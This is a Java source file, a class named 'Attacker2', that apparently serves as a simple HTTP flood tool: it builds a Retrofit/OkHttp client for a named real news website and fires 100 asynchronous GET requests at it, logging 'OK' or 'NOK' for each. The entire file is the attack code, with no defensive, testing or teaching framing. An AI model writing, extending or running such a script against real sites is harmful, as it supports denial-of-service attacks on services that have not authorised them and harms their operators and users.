import okhttp3.OkHttpClient;
import okhttp3.ResponseBody;
import okhttp3.logging.HttpLoggingInterceptor;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;

public class Attacker2 {

    public  static Logger LOG = LoggerFactory.getLogger(Attacker2.class);

    public static String site = "www.rt.com";
    public static void main(String[] args) {
        //
        HttpLoggingInterceptor interceptor = new HttpLoggingInterceptor();
        interceptor.setLevel(HttpLoggingInterceptor.Level.BODY);
        OkHttpClient client = new OkHttpClient.Builder().addInterceptor(interceptor).build();

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl("https://"+site)
                .client(client)
//                .addConverterFactory(GsonConverterFactory.create())
                .build();

        ApiService api = retrofit.create(ApiService.class);

        for (int index = 0; index < 100; index++) {
            //
            api.getRequest().enqueue(new Callback<ResponseBody>() {
                @Override
                public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                    LOG.info("OK");
                }

                @Override
                public void onFailure(Call<ResponseBody> call, Throwable t) {
                    LOG.error("NOK");
                }
            });

        }
    }
}
